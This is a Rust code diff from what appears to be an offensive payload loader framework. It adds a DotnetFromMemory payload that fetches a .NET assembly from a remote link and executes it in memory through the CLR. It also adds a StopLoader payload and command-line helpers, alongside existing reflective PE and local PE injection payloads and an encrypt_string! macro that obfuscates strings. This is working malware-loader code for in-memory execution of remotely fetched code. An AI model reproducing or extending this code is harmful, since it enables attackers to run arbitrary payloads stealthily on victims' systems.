@@ -51,6 +51,7 @@ pub enum PayloadExecThread {
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub enum Payload {
     Banner(),
+    StopLoader(),
     WriteFile(WriteFile),
     WriteZip(WriteZip),
     Exec(Exec),
@@ -58,11 +59,14 @@ pub enum Payload {
     DllFromMemory(DllFromMemory),
     ReflectivePEFromMemory(ReflectivePEFromMemory),
     LocalPeInjection(LocalPeInjection),
+    DotnetFromMemory(DotnetFromMemory),
+    
 }
 impl Payload {
     pub fn exec_payload(&self, config: &Config) -> PayloadExecThread {
         let exec_result = match &self {
             Payload::Banner() => banner(),
+            Payload::StopLoader() => stoploader(),
             Payload::WriteFile(payload) => payload.write_file(config),
             Payload::WriteZip(payload) => payload.write_zip(config),
             Payload::Exec(payload) => payload.exec_file(),
@@ -70,6 +74,7 @@ impl Payload {
             Payload::DllFromMemory(payload) => payload.dll_from_memory(config),
             Payload::ReflectivePEFromMemory(payload) => payload.reflective_pe_from_memory(config),
             Payload::LocalPeInjection(payload) => payload.exec_local_pe_injection(config),
+            Payload::DotnetFromMemory(payload) => payload.exec_dotnet_from_memory(config),
         };
 
         match exec_result {
@@ -114,6 +119,7 @@ impl Payload {
     pub fn is_runonce(&self) -> bool {
         match &self {
             Payload::Banner() => false,
+            Payload::StopLoader() => false,
             Payload::WriteFile(payload) => payload.runonce,
             Payload::WriteZip(payload) => payload.runonce,
             Payload::Exec(payload) => payload.runonce,
@@ -121,6 +127,7 @@ impl Payload {
             Payload::DllFromMemory(payload) => payload.runonce,
             Payload::ReflectivePEFromMemory(payload) => payload.runonce,
             Payload::LocalPeInjection(payload) => payload.runonce,
+            Payload::DotnetFromMemory(payload) => payload.runonce,
         }
     }
 }
@@ -276,6 +283,13 @@ pub fn banner() -> Result<PayloadExecThread, anyhow::Error> {
     thread::sleep(sleep_time);
     Ok(PayloadExecThread::NoThread())
 }
+
+
+
+pub fn stoploader() -> Result<PayloadExecThread, anyhow::Error> {
+    std::process::exit(0);
+}
+
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct WriteZip {
@@ -469,16 +483,40 @@ impl ReflectivePEFromMemory {
     }
 }
 
+#[cfg(target_os = "windows")]
+use crate::local_pe_injection::main::local_pe_injection;
+//#[cfg(target_os = "windows")]
+use std::env;
+
+
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub enum CommandLine {
     ArgParse(),
     Txt(String),
 }
 
-#[cfg(target_os = "windows")]
-use crate::local_pe_injection::main::local_pe_injection;
-#[cfg(target_os = "windows")]
-use std::env;
+impl CommandLine {
+    pub fn get_buffer(&self) -> Vec<String> {
+        match self.clone() {
+            CommandLine::ArgParse() => env::args().collect(),
+            CommandLine::Txt(commandline) => 
+                commandline.split_whitespace()
+                .map(|mot| mot.to_string())
+                .collect()
+        }
+    }
+    pub fn get_string(&self) -> String {
+        match self.clone() {
+            CommandLine::ArgParse() => {
+                let args: Vec<String> = env::args().collect();
+                args.join(" ")
+            }
+            CommandLine::Txt(commandline) => commandline,
+        }
+    }
+}
+
+
 
 #[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
 pub struct LocalPeInjection {
@@ -526,5 +564,58 @@ impl LocalPeInjection {
             let _ = local_pe_injection(args_ok, self.dll_entrypoint.clone(), data);
             return Ok(PayloadExecThread::NoThread());
         }
+    }
+}
+
+
+// DOTNET
+#[cfg(target_os = "windows")]
+use clroxide::clr::Clr;
+
+#[derive(PartialEq, Serialize, Deserialize, Debug, Clone)]
+pub struct DotnetFromMemory {
+    pub link: Link,
+    pub commandline: CommandLine,
+    pub thread: bool,
+    pub runonce: bool,
+    pub visible: bool,
+}
+impl DotnetFromMemory {
+    #[cfg(target_os = "linux")]
+    pub fn exec_dotnet_from_memory(
+        &self,
+        _config: &Config,
+    ) -> Result<PayloadExecThread, anyhow::Error> {
+        fail_linux_message(format!("{}", encrypt_string!("DotnetFromMemory")));
+        return Ok(PayloadExecThread::NoThread());
+    }
+
+    #[cfg(target_os = "windows")]
+    pub fn exec_dotnet_from_memory(
+        &self,
+        config: &Config,
+    ) -> Result<PayloadExecThread, anyhow::Error> {
+        let args_ok = self.commandline.get_buffer();
+        let data: Vec<u8> = self.link.fetch_data(config)?;
+
+        /*if self.thread {
+            let args_ok_commandline = args_ok.clone();
+            let thread = thread::spawn(move || {
+                let mut clr = Clr::new(data, thread)?;
+                let _: String = clr.run()?;
+    
+            });
+            return Ok(PayloadExecThread::Thread(
+                thread,
+                Payload::LocalPeInjection(self.clone()),
+            ));
+        } else {*/
+            let mut clr = Clr::new(data, args_ok).unwrap();
+            let result: String = clr.run().unwrap();
+            if self.visible {
+                println!("{}",result);
+            };
+            return Ok(PayloadExecThread::NoThread());
+        //}
     }
 }
